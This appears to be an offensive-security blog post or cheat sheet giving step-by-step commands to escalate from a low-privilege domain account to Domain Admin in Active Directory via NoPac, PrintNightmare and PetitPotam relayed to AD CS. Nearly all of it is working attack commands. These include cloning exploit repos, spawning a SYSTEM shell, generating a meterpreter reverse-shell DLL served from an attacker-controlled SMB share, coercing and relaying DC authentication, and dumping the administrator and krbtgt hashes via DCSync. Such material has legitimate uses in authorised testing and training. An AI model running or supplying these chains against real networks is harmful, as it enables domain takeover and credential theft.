---
title: Bleeding-Edge & Coercion
date: 2026-06-30 20:53:03

categories:
  - Active Directory
  - Exploitation
  - Bleeding-Edge & Coercion

tags:
  - Windows
  - Active-Directory
  - Privilege-Escalation
  - Domain-Escalation
  - NoPac
  - CVE-2021-42278
  - CVE-2021-42287
  - PrintNightmare
  - CVE-2021-1675
  - CVE-2021-34527
  - PetitPotam
  - CVE-2021-36942
  - ADCS
  - NTLM-Relay
  - PKINIT
  - Rubeus
  - Mimikatz
  - ntlmrelayx
  - PKINITtools
  - DCSync
  - secretsdump
  - NetExec
  - Impacket
  - Print-Spooler
  - Certificate-Abuse

cover: /img/ad-privilege-escalation.png
top_img: /img/bg-img.jpg
description: Learn how to escalate privileges in Active Directory by exploiting NoPac, PrintNightmare, and PetitPotam to obtain Domain Admin access using Linux and Windows tools.
---


> ➜ Everything here needs only a valid domain account yet can jump straight to Domain Admin. 

## NoPac (CVE-2021-42278 / 42287)

> ➜ NoPac chains two bugs: we rename a machine account we create to match the DC's name (42278), then request a service ticket after the DC object is restored, so the KDC issues us a ticket as the DC (42287). The result is a SYSTEM shell or a DCSync.

#### Setup

##### Clone NoPac

> ➜ Clone the exploit repo :

```bash
git clone https://github.com/Ridter/noPac.git
```

#### Exploitation

##### Scan Whether the Domain Is Vulnerable

> ➜ Run the bundled scanner to confirm the DC is exploitable before firing.

```bash
sudo python3 scanner.py <DOMAIN>/<user>:<pass> -dc-ip <DC_IP> -use-ldap
```

##### Pop a SYSTEM Shell on the DC

> ➜ Impersonate the administrator and drop into a semi-interactive SYSTEM shell.

```bash
sudo python3 noPac.py <DOMAIN>/<user>:<pass> -dc-ip <DC_IP> -dc-host <DC_HOST> --impersonate administrator -use-ldap -shell
```

##### DCSync Straight to a Dump

> ➜ Skip the shell and dump the administrator's hash directly via DCSync.

```bash
sudo python3 noPac.py <DOMAIN>/<user>:<pass> -dc-ip <DC_IP> -dc-host <DC_HOST> --impersonate administrator -use-ldap -dump -just-dc-user <DOMAIN>/administrator
```

## PrintNightmare (CVE-2021-1675 / 34527)

> ➜ PrintNightmare abuses the Print Spooler service: a low-priv user makes the spooler load a malicious driver DLL, which runs as SYSTEM on the target.

#### Setup

##### Clone the Exploit

> ➜ Clone the exploit repo :

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

##### Remove the Default Impacket

> ➜ This exploit requires cube0x0's Impacket fork, so uninstall the current one first.

```bash
pip3 uninstall impacket
```

##### Clone cube0x0's Impacket

> ➜ Clone the required fork.

```bash
git clone https://github.com/cube0x0/impacket
```

##### Install cube0x0's Impacket

> ➜ Install the fork so the exploit's RPC calls work.

```bash
cd impacket && sudo python3 ./setup.py install
```

#### Exploitation

##### Confirm the Spooler RPC Interface Is Reachable

> ➜ Check the target exposes MS-RPRN / MS-PAR.

```bash
rpcdump.py @<DC_IP> | egrep 'MS-RPRN|MS-PAR'
```

##### Generate the Payload DLL

> ➜ Build a reverse-shell driver DLL.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=8080 -f dll -o backupscript.dll
```

##### Host the DLL on an SMB Share

> ➜ Serve the DLL so the spooler can fetch it.

```bash
sudo smbserver.py -smb2support CompData /path/to/dll/
```

##### Fire the Exploit

> ➜ Force the spooler to load the DLL from our share, executing it as SYSTEM.

```bash
sudo python3 CVE-2021-1675.py <DOMAIN>/<user>:<pass>@<DC_IP> '\\<attacker>\CompData\backupscript.dll'
```


## PetitPotam → ADCS Relay (CVE-2021-36942)

> ➜ Coercion means forcing a machine to authenticate to us, PetitPotam coerces the DC to authenticate and we relay that authentication to the AD CS web-enrollment endpoint to request a certificate as the DC which we then use to DCSync.

#### Linux Path

##### Relay the DC Auth to the CA

> ➜ Stand up the relay against the CA's web-enrollment endpoint and request a DomainController certificate.

```bash
sudo ntlmrelayx.py -debug -smb2support --target http://<CA_HOST>/certsrv/certfnsh.asp --adcs --template DomainController
```

##### Coerce the DC to Authenticate

> ➜ Force the DC to authenticate to our relay.

```bash
python3 PetitPotam.py <attacker_IP> <DC_IP>
```

##### Request a TGT via PKINIT

> ➜ Use the captured base64 certificate to request a TGT for the DC account.

```bash
python3 /opt/PKINITtools/gettgtpkinit.py <DOMAIN>/<DC_NAME>\$ -pfx-base64 <BASE64_CERT> dc01.ccache
```

##### Export the Ticket

> ➜ Point Kerberos at the new ticket cache.

```bash
export KRB5CCNAME=dc01.ccache
```

##### DCSync the Domain

> ➜ DCSync the administrator using the DC's ticket.

```bash
secretsdump.py -just-dc-user <DOMAIN>/administrator -k -no-pass "<DC_FQDN>"
```

#### Alternative Way to Recover the DC's NT Hash

##### Extract the NT Hash

> ➜ Submit a TGS request for ourselves to recover the DC machine account's NT hash from the TGT.

```bash
python3 /opt/PKINITtools/getnthash.py -key <AS-REP_KEY> <DOMAIN>/<DC_NAME>\$
```

##### Validate via Pass-the-Hash

> ➜ Tool: **NetExec** (`nxc`). Confirm the recovered DC hash works against the DC.

```bash
nxc smb <DC_IP> -u <DC_NAME>$ -H <NT_HASH>
```


#### Windows Path

##### Request a TGT with Rubeus

> ➜ Request and inject a TGT using the certificate.

```powershell
.\Rubeus.exe asktgt /user:<DC_NAME>$ /certificate:<base64> /ptt
```

##### DCSync with Mimikatz

> ➜ DCSync the krbtgt account once the ticket is injected.

```powershell
.\mimikatz.exe "lsadump::dcsync /user:<DOMAIN>\krbtgt" exit
```


